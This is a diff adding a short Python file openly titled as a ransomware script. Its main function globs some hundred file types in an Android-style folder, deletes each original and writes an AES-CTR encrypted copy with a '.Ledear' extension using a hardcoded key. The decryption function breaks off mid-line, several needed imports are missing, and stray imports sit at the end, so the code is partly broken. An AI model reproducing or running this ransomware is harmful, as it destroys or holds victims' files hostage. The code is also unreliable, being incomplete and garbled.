@@ -1,0 +1,41 @@
+# ransomware-script-in-Python
+ransomware script in Python
+def jalan(z):
+  for e in z + '\n':
+     sys.stdout.write(e)
+     sys.stdout.flush()
+     time.sleep(0000000000.1)
+lst_arq = ["*.jpg","*.apk","*.txt","*.pdf","*.odt","*.xls","*.png","*.jpg","*.jpeg","*.html","*.epub","*.mp3","*.gif","*.doc","*.odp","*.ods","*.json","*.xml,","*.mp4","*.avi","*.md","*.ogg","*.py","*.m4a","*.ini","*.c","*.cpp","*.jar","*.rb","*.java","*.pl","*.raw","*.eml","*.msg","*.tmp","*.js","*.conf","*.config","*.yaml","*.info","*.dll","*.vdx","*.cache","*.csv","*.sql","*.sh","*.run","*.php","*.src","*.zip","*.rar","*.7z","*.tgz","*.exe","*,xlsx","*.mid","*.css","*.aspx","*.fla","*.psd","*.swf","*.tif","*.dwg","*.smali","*.bac","*.img","*.xar","*.bak","*.ios","*.dat","*.data","*.lua","*.psw","*.bkf","*.fbk","*.xar","*.moz-backup","*.orig","*.new","*.001","*.bps","*.sasf","*.src","*.perl","*.c#", "*.go","*.csproj","*.bash","*.sh","*.asic","*.run","*.vb","*.vbe","*.kt","*.lsp","*.vba","*.nt","*.kt","*.hat","*.swb","*.mysql","*.ttf","*.log","*.JPG"]
+try:
+    ledear = Path.home() / "/sdcard/ransom"
+except Exception:
+    pass
+os.chdir(ledear)
+def criptografando():
+    for files in lst_arq:
+        for format_file in glob.glob(files):
+            f = open(f'{ledear}/{format_file}', 'rb')
+            file_data = f.read()
+            f.close()
+            os.remove(f'{ledear}/{format_file}')
+            key = b"c1c50da9b950e3b3"  # 16 byts key 
+            aes = pyaes.AESModeOfOperationCTR(key)
+            crypto_data = aes.encrypt(file_data)
+            new_file = format_file + ".Ledear"
+            new_file = open(f'{ledear}/{new_file}', 'wb')
+            new_file.write(crypto_data)
+            new_file.close()
+def descrypt(decrypt_file):
+    try:
+        for file in glob.glob('*.Ledear'):
+            keybytes = decrypt_file.encode()
+            name_file = open(file, 'rb')
+            file_data = name_file.read
+
+
+
+
+
+from tkinter import font
+#pip install tkinter
+#pip install pyaes
